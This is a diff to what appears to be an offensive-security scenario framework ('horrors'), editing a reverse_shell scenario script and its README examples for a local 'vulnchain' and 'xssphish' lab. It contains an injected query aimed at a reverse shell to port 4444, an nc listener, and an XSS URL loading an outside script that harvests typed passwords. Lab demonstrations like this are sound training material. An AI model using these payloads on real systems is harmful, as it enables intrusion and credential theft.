@@ -11,7 +11,6 @@ async def reverse_shell(scenario):
     await scenario.http_post(
         'http://{rhost}:{rport}/query/'.format(**scenario.context),
         'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
-        scenario.context['post_headers'],
     )
 
 context = {
@@ -19,7 +18,6 @@ context = {
     'rport': 8008,
     'lhost': '127.0.0.1',
     'lport_reverse': 4444,
-    'post_headers': {'Content-Type': 'application/x-www-form-urlencoded'},
 }
 
 story = scenarios.Scenario(**context)
@@ -45,8 +43,8 @@ Examples are included in the `horrors/examples` directory. Try it out by running
 ### 1. vulnchain
 
     $ nc -lv4 4444
-    $ horrors/examples/vulnchain/victim.py
-    $ horrors/examples/vulnchain/attacker.py
+    examples/vulnchain:$ victim.py
+    examples/vulnchain:$ attacker.py
 
 [![example](https://img.youtube.com/vi/VQwysZItPrE/0.jpg)](https://www.youtube.com/watch?v=VQwysZItPrE)
 
@@ -54,8 +52,8 @@ Examples are included in the `horrors/examples` directory. Try it out by running
 
 Or (this one requires interaction):
 
-    $ horrors/examples/xssphish/victim.py
-    $ horrors/examples/xssphish/attacker.py
+    examples/xssphish:$ victim.py
+    examples/xssphish:$ attacker.py
 
 Now visit `http://127.0.0.1:8008/?message=<script src="http://127.0.0.1:8888/fakequery.js"></script>`, type some passwords and watch `collected.json` for incoming credentials.
 
